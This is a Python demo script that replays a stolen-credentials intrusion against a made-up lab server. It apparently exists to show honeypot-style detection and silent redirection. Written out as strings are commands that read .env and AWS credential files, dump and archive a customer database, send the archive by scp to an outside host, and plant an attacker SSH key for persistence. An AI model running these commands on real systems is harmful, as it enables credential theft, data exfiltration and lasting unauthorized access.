"""
scenario_stolen_credentials.py  --  a real-world intrusion, step by step.

Pattern modelled: an attacker logs in with a VALID, stolen password (no
second factor) and then works through the usual kill chain. This is the
most common way real breaches start (Verizon DBIR 2025: stolen credentials
were the top initial-access vector, 22% of breaches) and is how the 2021
Colonial Pipeline attackers got in (legacy VPN account, single password).
It is NOT a replay of that incident -- it is the same pattern on a made-up server.

Kill chain used (MITRE ATT&CK):
  1 Recon / discovery   -> normal-looking, answered by the REAL server
  2 Credential access   -> first command that triggers detection + silent redirect
  3 Use stolen secrets  -> attacker uses the (fake) DB password it just found
  4 Collection          -> database dump + archive
  5 Exfiltration        -> scp to an outside host
  6 Persistence         -> plant an SSH key
Run after victim_server.py and sdn_controller.py are up:
    python scenario_stolen_credentials.py            (add --fast to skip pauses)
"""
import re, socket, sys, time
from config import HOST, CONTROLLER_LISTEN_PORT

FAST = "--fast" in sys.argv
PAUSE = 0.0 if FAST else 1.2


def main():
    s = socket.create_connection((HOST, CONTROLLER_LISTEN_PORT))
    print(s.recv(1024).decode(), end="")
    state = {"pw": "unknown"}

    def run(cmd, phase=None):
        if phase:
            print(f"\n=== {phase} ===")
        time.sleep(PAUSE)
        print(f"\n$ {cmd}")
        s.sendall(cmd.encode())
        out = s.recv(8192).decode(errors="ignore")
        print(out.rsplit("$ ", 1)[0].rstrip("\n"))
        m = re.search(r"DB_PASSWORD=(\S+)", out)
        if m:
            state["pw"] = m.group(1)
        return out

    run("hostname", "1. Recon (looks like a normal admin session)")
    run("id"); run("uname -a"); run("cd /var/www/app"); run("ls -la"); run("ps aux | grep -E 'nginx|mysqld'")
    run("ss -tulpn")
    run("cat .env", "2. Credential access (this is the trigger)")
    run("grep -ri password /var/www/app")
    run("cat ~/.aws/credentials")
    run(f"mysqldump -u appuser -p'{state['pw']}' customers > /tmp/customers.sql",
        f"3-4. Use the stolen DB password and collect data")
    run("ls -lh /tmp")
    run("tar czf /tmp/cust.tgz /tmp/customers.sql")
    run("scp /tmp/cust.tgz ops@203.0.113.50:/tmp/", "5. Exfiltration")
    run("echo 'ssh-rsa AAAAB3NzaC1yc2E-attacker-key attacker@kali' >> ~/.ssh/authorized_keys",
        "6. Persistence")
    run("cat ~/.ssh/authorized_keys")
    run("exit")
    print("\n[ATTACKER VIEW] One continuous session on one server. Nothing looked different.")
    print(f"[NOTE] The DB password the attacker used ({state['pw']}) -- if it starts with HP-, it was honeydata.")


if __name__ == "__main__":
    main()
